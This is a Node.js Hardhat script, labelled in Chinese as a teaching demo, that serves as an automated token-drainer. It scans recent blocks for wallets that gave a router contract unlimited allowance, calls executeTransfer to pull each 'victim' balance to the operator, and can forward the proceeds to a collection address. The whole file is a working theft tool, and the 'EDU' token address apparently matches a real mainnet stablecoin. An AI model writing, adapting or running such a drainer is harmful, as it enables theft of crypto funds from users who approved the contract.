// scripts/drain.js
// 教学演示专用：自动扫描受害者并把其已授权的代币余额转走
//
// 用法：
//   # 单个受害者
//   npx hardhat run scripts/drain.js --network bscTestnet -- --victim 0xAbC...
//
//   # 自动扫描最近 X 个区块的所有地址（找出被授权过且有余额的）
//   npx hardhat run scripts/drain.js --network bscTestnet -- --auto 200
//
//   # 偷完后把收到的 EDU 转到一个汇总地址
//   npx hardhat run scripts/drain.js --network bscTestnet -- --victim 0xAbC... --send-to 0xDef...
//
// 环境变量（.env）：
//   PRIVATE_KEY=...

const { ethers } = require("hardhat");

// 已部署的合约地址
const ROUTER  = "0xE37dD33e4B4db6546199973321553e81bD0eD497"; // Create2 predicted
const EDUTOKEN = "0x55d398326f99059fF775485246999027B3197955";

// ERC20 / Router ABI（最小集合）
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)",
];
const ROUTER_ABI = [
  "function operator() view returns (address)",
  "function supported(address) view returns (bool)",
  "function executeTransfer(address token, address from)",
  "function withdraw(address token, uint256 amount)",
];

function parseArgs() {
  const args = process.argv.slice(2);
  const out = { victim: null, sendTo: null, auto: null, dryRun: false };
  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--victim")  out.victim  = args[++i];
    if (args[i] === "--send-to") out.sendTo  = args[++i];
    if (args[i] === "--auto")    out.auto    = parseInt(args[++i], 10);
    if (args[i] === "--dry-run") out.dryRun  = true;
  }
  return out;
}

function header(s) { console.log("\n" + "═".repeat(60) + "\n  " + s + "\n" + "═".repeat(60)); }

async function drainOne(router, token, victim, signer) {
  const bal = await token.balanceOf(victim);
  if (bal === 0n) {
    console.log(`  [跳过] ${victim} 余额为 0`);
    return 0n;
  }
  console.log(`  [扫描] 受害者 ${victim}`);
  console.log(`         余额  ${ethers.formatEther(bal)} EDU`);

  // 静态预览 executeTransfer
  try {
    await router.executeTransfer.staticCall(EDUTOKEN, victim);
  } catch (e) {
    console.log(`  [跳过] executeTransfer 静态调用失败：${e.shortMessage || e.message}`);
    console.log("         原因可能是：未无限授权 / 未在白名单 / 余额为 0");
    return 0n;
  }
  return bal;
}

async function executeTransfer(router, token, victim, signer, dryRun) {
  const balBefore = await token.balanceOf(signer.address);
  if (dryRun) {
    console.log(`  [DRY]  将调用 executeTransfer(${EDUTOKEN}, ${victim})`);
    return 0n;
  }
  console.log(`  [发送] executeTransfer tx ...`);
  const tx = await router.executeTransfer(EDUTOKEN, victim);
  console.log(`         hash: ${tx.hash}`);
  const receipt = await tx.wait();
  console.log(`         block: ${receipt.blockNumber}, gas: ${receipt.gasUsed}`);
  const balAfter = await token.balanceOf(signer.address);
  const got = balAfter - balBefore;
  console.log(`         收到: ${ethers.formatEther(got)} EDU`);
  return got;
}

async function sendOut(token, to, amount, signer, dryRun) {
  if (amount === 0n) return;
  if (dryRun) { console.log(`  [DRY]  将 transfer ${ethers.formatEther(amount)} EDU -> ${to}`); return; }
  console.log(`  [发送] transfer ${ethers.formatEther(amount)} EDU -> ${to}`);
  const tx = await token.transfer(to, amount);
  console.log(`         hash: ${tx.hash}`);
  await tx.wait();
  console.log(`         ✓ 已转出`);
}

async function autoScan(router, token, deployer, blocks) {
  // 简单做法：遍历最近 N 个区块里的 transactions，把 to == router 的 from 当候选
  // 然后查它对 EDUTOKEN 的 allowance > 0 且 balance > 0
  console.log(`  扫描最近 ${blocks} 个区块的交易 ...`);
  const tip = await ethers.provider.getBlockNumber();
  const candidates = new Set();
  for (let b = tip; b > tip - blocks && b > 0; b--) {
    const block = await ethers.provider.getBlock(b, true);
    if (!block || !block.transactions) continue;
    for (const tx of block.transactions) {
      if (typeof tx === "string") continue;
      if (tx.to && tx.to.toLowerCase() === ROUTER.toLowerCase()) {
        candidates.add(tx.from);
      }
    }
  }
  console.log(`  候选数: ${candidates.size}`);

  const ALLOWANCE_ABI = ["function allowance(address owner, address spender) view returns (uint256)"];
  const MAX = ethers.MaxUint256;
  const hits = [];
  for (const addr of candidates) {
    if (addr.toLowerCase() === deployer.toLowerCase()) continue;
    try {
      const c = new ethers.Contract(EDUTOKEN, ALLOWANCE_ABI, ethers.provider);
      const allow = await c.allowance(addr, ROUTER);
      const bal = await token.balanceOf(addr);
      if (allow >= MAX / 2n && bal > 0n) {
        hits.push({ addr, bal });
      }
    } catch {}
  }
  return hits;
}

async function main() {
  const args = parseArgs();
  const [signer] = await ethers.getSigners();
  const me = signer.address;

  header("EduSwap 教学演示 - 自动化 drain 工具");
  console.log(`  操作账户  : ${me}`);
  console.log(`  Router    : ${ROUTER}`);
  console.log(`  EduToken  : ${EDUTOKEN}`);
  console.log(`  网络      : ${(await ethers.provider.getNetwork()).name}`);
  console.log(`  模式      : ${args.dryRun ? "DRY-RUN" : "LIVE"}`);

  const router = new ethers.Contract(ROUTER, ROUTER_ABI, signer);
  const token  = new ethers.Contract(EDUTOKEN, ERC20_ABI, signer);

  // 验证 operator
  const op = await router.operator();
  if (op.toLowerCase() !== me.toLowerCase()) {
    console.log(`\n  ⚠ 当前账户不是 operator (operator = ${op})，无法执行`);
    process.exit(1);
  }
  console.log(`  ✓ operator 验证通过`);

  let targets = [];
  if (args.victim) {
    targets = [args.victim];
  } else if (args.auto) {
    const hits = await autoScan(router, token, me, args.auto);
    targets = hits.map(h => h.addr);
    console.log(`  命中 ${targets.length} 个有授权且有余额的账户:`);
    hits.forEach(h => console.log(`    - ${h.addr}  (${ethers.formatEther(h.bal)} EDU)`));
  } else {
    console.log(`\n  用法:`);
    console.log(`    npx hardhat run scripts/drain.js --network bscTestnet -- --victim 0xAbC...`);
    console.log(`    npx hardhat run scripts/drain.js --network bscTestnet -- --auto 200`);
    console.log(`    npx hardhat run scripts/drain.js --network bscTestnet -- --victim 0xAbC... --send-to 0xDef...`);
    process.exit(0);
  }

  if (targets.length === 0) {
    console.log(`\n  没有可处理的目标，退出。`);
    process.exit(0);
  }

  header("开始处理");
  let totalGot = 0n;
  for (const victim of targets) {
    const expectedBal = await drainOne(router, token, victim, signer);
    if (expectedBal === 0n) continue;
    const got = await executeTransfer(router, token, victim, signer, args.dryRun);
    totalGot += got;
  }

  if (args.sendTo) {
    header("转出汇总");
    const myBal = await token.balanceOf(me);
    const toSend = totalGot > 0n ? totalGot : myBal;
    await sendOut(token, args.sendTo, toSend, signer, args.dryRun);
  }

  header("完成");
  const finalBal = await token.balanceOf(me);
  console.log(`  操作账户当前 EDU 余额: ${ethers.formatEther(finalBal)}`);
  console.log(`  本次共收到         : ${ethers.formatEther(totalGot)} EDU`);
}

main().catch((e) => { console.error(e); process.exit(1); });
